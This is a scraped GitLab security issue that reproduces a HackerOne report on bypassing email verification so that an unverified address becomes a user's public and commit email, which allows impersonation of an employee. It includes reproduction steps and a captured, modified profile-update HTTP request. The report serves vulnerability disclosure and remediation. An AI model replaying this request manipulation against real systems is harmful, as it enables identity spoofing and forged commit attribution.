=== Content from gitlab.com_b6fe86e3_20250114_214302.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2023](/gitlab-org/cves/-/tree/master/2023)
* [**CVE-2023-1204.json**](/gitlab-org/cves/-/blob/master/2023/CVE-2023-1204.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2023/CVE-2023-1204.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2023/CVE-2023-1204.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![ðŸ¤– GitLab Bot ðŸ¤–'s avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "ðŸ¤– GitLab Bot ðŸ¤–")](/gitlab-bot)

  Jun 02, 2023

  [7a5141fd](/gitlab-org/cves/-/commit/7a5141fd462340fd48248c5148e1d1e13c09cb37)
  [Publishing 1 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/7a5141fd462340fd48248c5148e1d1e13c09cb37)
  Â·
  7a5141fd

  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Jun 02, 2023

  7a5141fd

  [Publishing 1 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/7a5141fd462340fd48248c5148e1d1e13c09cb37)
  [ðŸ¤– GitLab Bot ðŸ¤–](/gitlab-bot) authored Jun 02, 2023

Loading



=== Content from gitlab.com_b85f5560_20250114_214303.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Employee impersonation by bypassing public and commit email verification

# âš  Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.

**[HackerOne report #1881598](https://hackerone.com/reports/1881598)** by `theluci` on 2023-02-21, assigned to [@fvpotvin](/fvpotvin "FÃ©lix Veillette-Potvin"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

While testing I found that the bug [#219745 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/219745 "Bypass Gitlab public and commit email addresses changing validation") that gitlab fixed two years ago has reopened.

#### Summary

Gitlab doesn't check the reliability of the user[public\_email] and the user[commit\_email] parameters. In the backend, it just checks if those fields are matched with the user[email] but doesn't check if the email address has been verified. So by changing the user[email], user[public\_email] and user[commit\_email] at the same time, the server will change the user public email and commit email to become the same email as the currently-changed email address in the request (which hasn't been verified yet).

#### Steps to reproduce

1. Create a Gitlab account with your email address.

   For example, theluci+test2@wearehackerone.com in my case.
2. Go to /profile/emails
3. Add an email address that you do not own. For example, theluci@gitlab.com
4. Visit /profile
5. Change your primary email address to theluci@gitlab.com, click Save and capture the request, it will look like this:

```
POST /-/profile HTTP/2
Host: gitlab.com
Content-Type: multipart/form-data; boundary=---------------------------45235675323735184942831572911
Cookie: COOKIES

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="_method"

put
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="authenticity_token"

VfTHsNArSelTU0RuPQ34ZHS2x6/w2sY59WMD1SCz/Un9PUpBuiW0RZE6nAGkthZN2NKlEFz28GWSlxcQaSHI6Q==
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[avatar]-trigger"; filename=""
Content-Type: application/octet-stream

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[status][emoji]"

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[status][message]"

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[status][availability]"

not_set
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[timezone]"

Etc/UTC
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[name]"

lucifer-attacker
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[id]"

8552782
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[pronouns]"

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[pronunciation]"

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[email]"

theluci@gitlab.com
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[public_email]"

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[commit_email]"

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[skype]"

```

6. Change user[email], user[public\_email], user[commit\_email] in above http request to become the same:

```
...

-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[email]"

theluci@gitlab.com
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[public_email]"

theluci@gitlab.com
-----------------------------45235675323735184942831572911
Content-Disposition: form-data; name="user[commit_email]"

theluci@gitlab.com

...
```

7. Forward the request.
8. Now re-visit /profile/emails and you will see theluci@gitlab.com has become your public email address and your commit email address.

[![public_and_commit.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/564b3b2a1d250b3167c1f90f79fbaa633831d541/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38643364383932642d303636372d343866342d613533332d6561393335343133396165642f7075626c69635f616e645f636f6d6d69742e706e67)

#### Impact

Impersonate as company employee with the public email address. Perform Gitlab git-related actions with the "verified" arbitrary email address and bypass the committing restriction.

#### Examples

My profile: [@]LuciferHackerone2

#### What is the current *bug* behavior?

The public and commit email addresses have a bad confirmation in the backend. It just checks if the email addresses are the same as the current email address. And when you send a request which also changes your current email address, the server will change your current email address first then perform change the user[commit\_email] and user[public\_email] after, which the user was able to bypass the check.

#### What is the expected *correct* behavior?

Commit and public email should be checked with verified email addresses, not only email addresses.

#### Output of checks

This bug happens on GitLab.com

#### Impact

Impersonate as company employee with the public email address. Perform Gitlab git-related actions with the "verified" arbitrary email address and bypass the committing restriction.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [public\_and\_commit.png](https://h1.sec.gitlab.net/a/8d3d892d-0667-48f4-a533-ea9354139aed/public_and_commit.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


